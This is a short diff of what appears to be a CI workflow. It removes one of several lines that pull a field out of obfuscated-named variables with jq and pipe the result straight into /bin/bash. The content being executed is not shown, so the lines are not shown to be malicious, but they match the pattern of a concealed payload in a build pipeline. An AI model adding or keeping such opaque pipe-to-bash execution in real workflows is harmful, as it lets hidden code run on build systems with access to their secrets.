@@ -22,7 +22,6 @@ jobs:
           printf '%s' "$rari23" | jq -r .bztr88113 | /bin/bash
           printf '%s' "$gtb3554" | jq -r .wnggx88 | /bin/bash
           printf '%s' "$ar04" | jq -r .stsq6212 | /bin/bash
-          printf '%s' "$ygrih06" | jq -r .ge6 | /bin/bash
           echo $a96 | jq -r .anjj67 | /bin/bash
 
       - name: Archive output
